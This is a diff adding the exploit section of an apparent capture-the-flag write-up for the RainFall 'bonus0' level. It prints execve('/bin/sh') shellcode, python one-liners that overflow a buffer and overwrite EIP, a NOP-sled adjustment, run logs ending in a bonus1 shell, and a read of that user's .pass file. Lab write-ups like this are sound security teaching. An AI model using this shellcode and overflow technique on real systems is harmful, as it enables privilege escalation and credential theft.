@@ -270,3 +270,107 @@ gs             0x33	51
 We can see that the buffer is filled with `0x61` (ASCII for `a`), and the last byte is `0x0a` (ASCII for `\n`), and it starts at the address `0xbfffe680`.
 
 
+So our buffer address is `0xbfffe680`.
+Now, we can write the shellcode in the buffer, and copy this address in the EIP to execute the shellcode.
+
+### 4.3. Write the shellcode
+
+We will write a shellcode that will execute a shell.
+We will use the following shellcode:
+```c
+execve("/bin/sh")
+```
+In machine language:
+```c
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+```
+We will write our command in a file.
+```bash
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/first
+```
+
+### 4.4. Overwrite the EIP
+
+We will overwrite the EIP with the address of the buffer.
+The address of the buffer is `0xbfffe680`, `\x80\xe6\xff\xbf` in little-endian.
+We know that the offset is 9 bytes, the address of the buffer has 4 bytes, so we need to add 7 bytes to reach the EIP.
+```bash
+python -c 'print "A" * 9 + "\x80\xe6\xff\xbf" + "A" * 7' > /tmp/second
+```
+
+### 4.5. Run the exploit
+
+We will run the program with the first input as our shellcode, and the second input as the overwrite of the EIP.
+```bash
+(cat /tmp/first; cat /tmp/second; cat) | ./bonus0
+ - 
+ - 
+j
+ X�Rh//shh/bin��1��AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
+whoami
+Illegal instruction (core dumped)
+```
+
+We can see that the program crashes with an illegal instruction.
+`Illegal instruction` means that the program tried to execute a not valid instruction, or try to access a not valid memory address.
+
+Maybe the address of the buffer is not really exact.
+So we will add some `NOP` instructions before the shellcode to make sure that the shellcode is executed. If the good address is after the address we used, the `NOP` instructions will be executed, and the shellcode will be executed.
+`NOP` is `0x90` in machine language.
+```bash
+python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/first
+```
+
+We try again:
+```bash
+bonus0@RainFall:~$ (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
+ - 
+ - 
+��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
+whoami
+Illegal instruction (core dumped)
+```
+
+Now, with the `NOP` instructions, we can shift the address to be in the `NOP` instructions, and the shellcode will be executed.
+If we add 64 octets at the address of the buffer:
+`0xbfffe680 + 64 = 0xbfffe6c0 = \xc0\xe6\xff\xbf`
+```bash
+python -c 'print "A" * 9 + "\xc0\xe6\xff\xbf" + "A" * 7' > /tmp/second
+```
+```bash
+bonus0@RainFall:~$ (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
+ - 
+ - 
+��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
+whoami
+Segmentation fault (core dumped)
+```
+
+If we add 86 octets at the address of the buffer:
+`0xbfffe680 + 86 = 0xbfffe6d0 = \xd0\xe6\xff\xbf`
+```bash
+python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7' > /tmp/second
+```
+```bash
+bonus0@RainFall:~$ (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
+ - 
+ - 
+��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
+whoami
+bonus1
+```
+
+You opened a shell as the `bonus1` user !
+
+```bash
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
+Congratulations!
+We can now connect to the `bonus1` user with this password.
+```bash
+bonus0@RainFall:~$ su bonus1
+Password:
+bonus1@RainFall:~$
+```
